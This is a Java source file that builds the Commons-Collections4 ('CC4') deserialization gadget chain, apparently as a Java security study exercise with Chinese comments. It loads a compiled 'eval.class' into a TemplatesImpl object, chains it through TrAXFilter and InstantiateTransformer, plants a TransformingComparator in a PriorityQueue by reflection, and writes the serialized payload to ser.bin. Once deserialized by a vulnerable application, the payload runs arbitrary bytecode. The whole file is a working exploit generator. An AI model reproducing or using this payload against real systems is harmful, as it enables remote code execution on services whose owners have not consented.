package com.melll;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;

        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Vshex");

        Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Document\\Java安全\\CC\\CC3\\target\\classes\\com\\melll\\eval.class"));
        byte [][] codes =new byte[][]{code};
        _bytecodesField.set(templates,codes);
//        反序列化 readobject 自动赋值 _tfactory 不需要赋值
        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
//***************
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(1);//add 时调用compare
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,transformingComparator);

        serialize(priorityQueue);

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
}